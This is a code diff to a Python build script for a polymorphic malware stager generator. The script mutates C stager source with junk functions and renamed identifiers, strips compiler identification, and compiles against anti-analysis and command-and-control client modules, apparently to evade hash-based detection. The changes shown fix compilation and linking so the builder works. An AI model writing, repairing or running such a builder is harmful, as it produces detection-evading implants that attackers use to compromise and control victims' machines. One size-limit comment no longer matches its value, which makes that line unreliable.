@@ -45,7 +45,7 @@ COMPILERS = ["gcc", "clang", "musl-gcc"]
 OPT_LEVELS = ["-O0", "-O1", "-O2", "-O3", "-Os", "-Oz"]
 JUNK_FUNC_MIN = 5
 JUNK_FUNC_MAX = 20
-MAX_STAGER_SIZE = 65536  # 64 KB
+MAX_STAGER_SIZE = 10 * 1024 * 1024  # 64 KB
 
 # Known hash registry (in production: database)
 HASH_REGISTRY_FILE = "hash_registry.json"
@@ -201,17 +201,10 @@ class StagerMutator:
             self.junk_functions.append(name)
 
         # Also add calls to junk functions in unreachable code paths
-        junk_calls = "\n/* Initialization helpers */\n"
-        junk_calls += "static void __attribute__((unused)) "
-        junk_calls += "__init_subsystems(void) {\n"
-        junk_calls += "    volatile int __x = 0;\n"
-        for name in self.junk_functions[:5]:
-            junk_calls += f"    if (__x > 1000000) {name}("
-            # Generate appropriate arguments based on the function
-            junk_calls += f"{self.rng.randint(1, 100)}, "
-            junk_calls += f"{self.rng.randint(1, 100)});\n"
-        junk_calls += "}\n"
-        junk_code += junk_calls
+        # NOTE: Removed to avoid argument mismatch errors during compilation.
+        # The randomized signature generation vs fixed call site logic was flawed.
+        # Future improvement: track signatures for each generated junk function.
+        junk_calls = ""
 
         # Insert before main()
         main_pos = self.source.find("int main(")
@@ -372,13 +365,16 @@ def compile_stager(source_path: str, output_path: str,
         "-fno-exceptions",
         "-fno-asynchronous-unwind-tables",
         "-fno-ident",             # Remove compiler identification
-        "-fvisibility=hidden",
         "-Wno-unused-function",
         "-Wno-unused-variable",
+        "-Icommon", "-Ic2_comms", "-Istager",
         "-o", output_path,
         source_path,
-        "-lcrypto", "-lssl",
-        "-lpthread",
+        os.path.abspath("stager/anti_analysis.c"),
+        os.path.abspath("common/logging.c"),
+        os.path.abspath("c2_comms/crypto.c"),
+        os.path.abspath("c2_comms/c2_client.c"),
+        "-lssl", "-lcrypto", "-lpthread", "-ldl",
     ]
 
     # Add compiler-specific flags
@@ -394,8 +390,11 @@ def compile_stager(source_path: str, output_path: str,
             text=True,
             timeout=60,
         )
+        if result.returncode != 0:
+            print(f"[!] Compilation Error:\n{result.stderr}")
         return result.returncode == 0
     except subprocess.TimeoutExpired:
+        print("[!] Compilation Timed Out")
         return False
 
 
@@ -494,7 +493,17 @@ def main():
         print(f"    Renamed IDs: {mutation_log['identifiers_renamed']}")
 
         # Step 2: Write mutated source to temp file
-        temp_source = f"/tmp/aegis_stager_{seed}.c"
+        temp_source = f"build/aegis_stager_{seed}.c"
+        os.makedirs("build", exist_ok=True)
+
+        # Replace problematic includes with absolute paths
+        cwd = os.getcwd()
+        mutated_source = mutated_source.replace('#include "anti_analysis.h"', f'#include "{cwd}/stager/anti_analysis.h"')
+        mutated_source = mutated_source.replace('#include "../c2_comms/c2_client.h"', f'#include "{cwd}/c2_comms/c2_client.h"')
+        mutated_source = mutated_source.replace('#include "../c2_comms/crypto.h"', f'#include "{cwd}/c2_comms/crypto.h"')
+        mutated_source = mutated_source.replace('#include "../common/config.h"', f'#include "{cwd}/common/config.h"')
+        mutated_source = mutated_source.replace('#include "../common/logging.h"', f'#include "{cwd}/common/logging.h"')
+
         with open(temp_source, "w") as f:
             f.write(mutated_source)
 
